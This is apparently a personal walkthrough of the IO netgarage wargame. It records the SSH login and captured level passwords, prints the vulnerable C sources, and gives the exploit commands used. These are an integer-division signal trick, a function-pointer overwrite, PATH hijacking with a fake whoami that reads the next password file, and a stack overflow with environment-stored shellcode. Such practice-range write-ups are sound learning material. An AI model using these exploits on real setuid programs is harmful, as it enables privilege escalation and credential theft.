 ssh level1@io.netgarage.org

# level1: level1
# level2: XNWFtWKWHhaaXoKI
# level3: OlhCmdZKbuzqngfz
# level4: 7WhHa5HWMNRAYl9T
# level5: DNLM3Vu0mZfX0pDd
# level6: fQ8W8YlSBJBWKV2R
# level7:
# level8:
# level10:
# level11:
# level12:
# level13:
# level14:
# level15:
# level16:

# level1: level1
level1@io:/levels$ ./level01
Enter the 3 digit passcode to enter: 271
Congrats you found it, now read the password for level2 from /home/level2/.pass
sh-4.3$ cat /home/level2/.pass

# level2: XNWFtWKWHhaaXoKI

level2@io:/levels$ cat level02.c 
//a little fun brought to you by bla

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void catcher(int a)
{
        setresuid(geteuid(),geteuid(),geteuid());
    printf("WIN!\n");
        system("/bin/sh");
        exit(0);
}

int main(int argc, char **argv)
{
    puts("source code is available in level02.c\n");

        if (argc != 3 || !atoi(argv[2]))
                return 1;
        signal(SIGFPE, catcher);
        return abs(atoi(argv[1])) / atoi(argv[2]);
}

---------

return abs(atoi(argv[1])) / atoi(argv[2]);

abs(INT_MIN) is undefined, but in my compiler:
abs(-2147483648) = -2147483648

INT_MIN/-1 throws a floating point exception

level2@io:/levels$ ./level02 -2147483648 -1
source code is available in level02.c

WIN!
sh-4.3$ cat /home/level3/.pass
OlhCmdZKbuzqngfz

# level3: OlhCmdZKbuzqngfz
level3@io:/levels$ cat level03.c
//bla, based on work by beach

#include <stdio.h>
#include <string.h>

void good()
{
        puts("Win.");
        execl("/bin/sh", "sh", NULL);
}
void bad()
{
        printf("I'm so sorry, you're at %p and you want to be at %p\n", bad, good);
}

int main(int argc, char **argv, char **envp)
{
        void (*functionpointer)(void) = bad;
        char buffer[50];

        if(argc != 2 || strlen(argv[1]) < 4)
                return 0;

        memcpy(buffer, argv[1], strlen(argv[1]));
        memset(buffer, 0, strlen(argv[1]) - 4);

        printf("This is exciting we're going to %p\n", functionpointer);
        functionpointer();

        return 0;
}

---------

level3@io:/levels$ ./level03 ABCD
This is exciting we're going to 0x80484a4
I'm so sorry, you're at 0x80484a4 and you want to be at 0x8048474

level3@io:/levels$ ./level03 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaABCD
This is exciting we're going to 0x44434241
Segmentation fault

level3@io:/levels$ ./level03 $(python -c 'print("a"*76+"ABCD")')
This is exciting we're going to 0x44434241
Segmentation fault

level3@io:/levels$ ./level03 $(python -c 'print("a"*76+"\x74\x84\x04\x08")')
This is exciting we're going to 0x8048474
Win.
sh-4.3$ cat /home/level4/.pass
7WhHa5HWMNRAYl9T


# level4: 7WhHa5HWMNRAYl9T

level4@io:/levels$ cat level04_alt.c
//written by bla
#include <stdlib.h>
int main(){
	setresuid(geteuid(), geteuid(), geteuid());
	system("/usr/bin/id");
}


level4@io:/levels$ cat level04.c
//writen by bla
#include <stdlib.h>
#include <stdio.h>

int main() {
        char username[1024];
        FILE* f = popen("whoami","r");
        fgets(username, sizeof(username), f);
        printf("Welcome %s", username);

        return 0;
}


---------

level4@io:/tmp/graaa$ /levels/level04
Welcome level5

whoami is not qualified with its full path.
we make our own whoami-command :D

level4@io:/tmp/graaa$ cat whoami.c
#include <stdlib.h>
#include <stdio.h>

int main() {
        char username[1024];
        FILE* f = popen("cat /home/level5/.pass","r");
        fgets(username, sizeof(username), f);
        printf("%s", username);
        return 0;
}

level4@io:/tmp/graaa$ gcc whoami.c -o whoami
level4@io:/tmp/graaa$ export PATH=.:${PATH}
level4@io:/tmp/graaa$ /levels/level04
Welcome DNLM3Vu0mZfX0pDd


# level5: DNLM3Vu0mZfX0pDd

level5@io:/levels$ cat level05.c 
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv) {
  char buf[128];
  if(argc < 2) return 1;
  strcpy(buf, argv[1]);
  printf("%s\n", buf);	
  return 0;
}

there is an level05_alt.c but that looks intimidating

---------

level5@io:/levels$ ./level05 $(python -c 'print("A"*150)')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault

hkopp:~$ ragg2 -P 170 -r
AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5A

hkopp:~$ ragg2 -P 170 -q 0x41417641
Little endian: 140
Big endian: 139

[0xb7fdba20]> ood `!ragg2 -P170 -r`
Wait event received by different pid 21486
Process with PID 22581 started...
File dbg:///levels/level05  AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5A reopened in read-write mode
= attach 22581 22581
Assuming filepath /levels/level05
= attach 22581 21486
= attach 22581 22581
[0xb7fdba20]> dc
AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5A
child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0x41417641 code=1 ret=0
= attach 22581 1
[0x41417641]> wopO `dr eip`
140

level5@io:/levels$ export SHELLCODE=$(echo -n $(python -c 'print ("\x90"*40)')$(ragg2 -i exec -r))
level5@io:/tmp/bla$ ./getenvaddr SHELLCODE /levels/level5
SHELLCODE will be at 0xbffffd97

level5@io:/tmp/bla$ /levels/level05 $(python -c 'print("A"*140+"\x97\xfd\xff\xbf")')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
sh-4.3$ cat /home/level6/.pass
fQ8W8YlSBJBWKV2R


# level6: fQ8W8YlSBJBWKV2R

//written by bla
//inspired by nnp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

enum{
LANG_ENGLISH,
LANG_FRANCAIS,
LANG_DEUTSCH,
};

int language = LANG_ENGLISH;

struct UserRecord{
        char name[40];
        char password[32];
        int id;
};

void greetuser(struct UserRecord user){
        char greeting[64];
        switch(language){
                case LANG_ENGLISH:
                        strcpy(greeting, "Hi "); break;
                case LANG_FRANCAIS:
                        strcpy(greeting, "Bienvenue "); break;
                case LANG_DEUTSCH:
                        strcpy(greeting, "Willkommen "); break;
        }
        strcat(greeting, user.name);
        printf("%s\n", greeting);
}

int main(int argc, char **argv, char **env){
        if(argc != 3) {
                printf("USAGE: %s [name] [password]\n", argv[0]);
                return 1;
        }

        struct UserRecord user = {0};
        strncpy(user.name, argv[1], sizeof(user.name));
        strncpy(user.password, argv[2], sizeof(user.password));

        char *envlang = getenv("LANG");
        if(envlang)
                if(!memcmp(envlang, "fr", 2))
                        language = LANG_FRANCAIS;
                else if(!memcmp(envlang, "de", 2))
                        language = LANG_DEUTSCH;

        greetuser(user);
}

---------

Heap overflow. Password and name can be longer than 32, resp. 40 Bytes
And then overflow in greeting.
level6@io:/levels$ ./level06 $(python -c 'print("A"*60)') $(python -c 'print("B"*29)')
Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Segmentation fault
however, address of eip is at 0x00424236

---------

level6@io:/levels$ cat level06_alt.c
#include <stdio.h>
#include <sys/fcntl.h>
#include <unistd.h>
#include <string.h>

char pass[32];

int main(int argc, char * argv[])
{

        char buf[32];
        FILE *f;

        f = fopen("/levels/level06_alt.pass", "r");

        fgets(pass, 32, f);
        fgets(buf, 999, stdin);

        if(!strcmp(buf, pass)) {
                printf("Success!\n");
                setreuid(geteuid(), geteuid());
                execl("/bin/sh", NULL, NULL);
        }

        return 0;
}

regular stacksmash. buf is only 32 Bytes long, But i can write 999 in
it.

level6@io:/levels$ ./level06_alt
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
*** stack smashing detected ***: ./level06_alt terminated
======= Backtrace: =========
/lib/i386-linux-gnu/libc.so.6(+0x6737a)[0xb7e7537a]
/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x37)[0xb7f05f37]
/lib/i386-linux-gnu/libc.so.6(+0xf7ef8)[0xb7f05ef8]
./level06_alt[0x8048652]
/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf6)[0xb7e26276]
======= Memory map: ========
08048000-08049000 r-xp 00000000 08:01 140203     /levels/level06_alt
08049000-0804a000 rw-p 00000000 08:01 140203     /levels/level06_alt
0804a000-0806b000 rw-p 00000000 00:00 0          [heap]
b7de2000-b7dfe000 r-xp 00000000 08:01 9111       /lib/i386-linux-gnu/libgcc_s.so.1
b7dfe000-b7dff000 r--p 0001b000 08:01 9111       /lib/i386-linux-gnu/libgcc_s.so.1
b7dff000-b7e00000 rw-p 0001c000 08:01 9111       /lib/i386-linux-gnu/libgcc_s.so.1
b7e0e000-b7fbf000 r-xp 00000000 08:01 577        /lib/i386-linux-gnu/libc-2.24.so
b7fbf000-b7fc0000 ---p 001b1000 08:01 577        /lib/i386-linux-gnu/libc-2.24.so
b7fc0000-b7fc2000 r--p 001b1000 08:01 577        /lib/i386-linux-gnu/libc-2.24.so
b7fc2000-b7fc3000 rw-p 001b3000 08:01 577        /lib/i386-linux-gnu/libc-2.24.so
b7fc3000-b7fc6000 rw-p 00000000 00:00 0
b7fd3000-b7fd7000 rw-p 00000000 00:00 0
b7fd7000-b7fd9000 r--p 00000000 00:00 0          [vvar]
b7fd9000-b7fdb000 r-xp 00000000 00:00 0          [vdso]
b7fdb000-b7ffe000 r-xp 00000000 08:01 321        /lib/i386-linux-gnu/ld-2.24.so
b7ffe000-b7fff000 r--p 00022000 08:01 321        /lib/i386-linux-gnu/ld-2.24.so
b7fff000-b8000000 rw-p 00023000 08:01 321        /lib/i386-linux-gnu/ld-2.24.so
bffdf000-c0000000 rw-p 00000000 00:00 0          [stack]
Aborted

Whoppa! Canaries are activated.

# level7:
# level8:
# level9:
